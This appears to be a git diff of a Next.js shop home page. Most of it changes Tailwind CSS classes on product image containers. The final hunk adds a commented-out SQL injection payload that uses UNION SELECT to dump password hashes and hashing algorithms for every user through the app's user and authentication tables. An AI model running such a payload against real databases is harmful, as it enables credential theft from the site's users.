@@ -206,7 +206,7 @@ const Home: NextPage = () => {
         {featured && (
           <section aria-labelledby="cause-heading">
             <div className="relative bg-gray-800 py-32 px-6 sm:py-40 sm:px-12 lg:px-16">
-              <div className="absolute inset-0 overflow-hidden">
+              <div className="flex min-h-80 aspect-w-1 aspect-h-1 w-full overflow-hidden rounded-md bg-gray-200 group-hover:opacity-75 lg:aspect-none lg:h-80">
                 {featured.Media.length !== 0 ? (
                   <Media media={featured.Media[0].mediaId}></Media>
                 ) : (
@@ -263,7 +263,7 @@ const Home: NextPage = () => {
               <div className="mt-6 grid grid-cols-1 gap-y-10 sm:grid-cols-3 sm:gap-y-0 sm:gap-x-6 lg:gap-x-8">
                 {favouriteProducts.map((favourite) => (
                   <div key={favourite.productId} className="group relative">
-                    <div className="h-96 w-full overflow-hidden rounded-lg group-hover:opacity-75 sm:aspect-w-2 sm:aspect-h-3 sm:h-auto">
+                    <div className="flex min-h-80 aspect-w-1 aspect-h-1 w-full overflow-hidden rounded-md bg-gray-200 group-hover:opacity-75 lg:aspect-none lg:h-80">
                       {favourite.Media.length !== 0 ? (
                         <Media media={favourite.Media[0].mediaId}></Media>
                       ) : (
@@ -439,3 +439,5 @@ export default Home;
 //   }
 // );
 // const seller = trpc.useMutation(["seller.addProducts"]);
+
+//     `nope' in 'not')>0 UNION  select "public"."Password"."password", "public"."Password"."hashingAlgorithm" from "public"."Password" where "public"."Password"."passwordId" in (select "public"."UserAuthentication"."currentPasswordId" from "public"."UserAuthentication" where "public"."UserAuthentication"."userId" in (select id from "public"."User" where 1=1));--
